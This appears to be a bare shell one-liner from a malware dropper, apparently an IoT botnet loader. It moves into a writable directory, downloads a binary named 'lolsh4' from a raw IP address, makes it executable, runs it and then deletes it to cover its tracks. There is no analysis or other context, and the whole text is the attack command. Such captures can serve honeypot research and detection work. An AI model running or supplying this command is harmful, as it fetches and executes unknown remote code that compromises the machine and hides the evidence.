cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.234.18/lolsh4; chmod +x lolsh4; ./lolsh4; rm -rf lolsh4
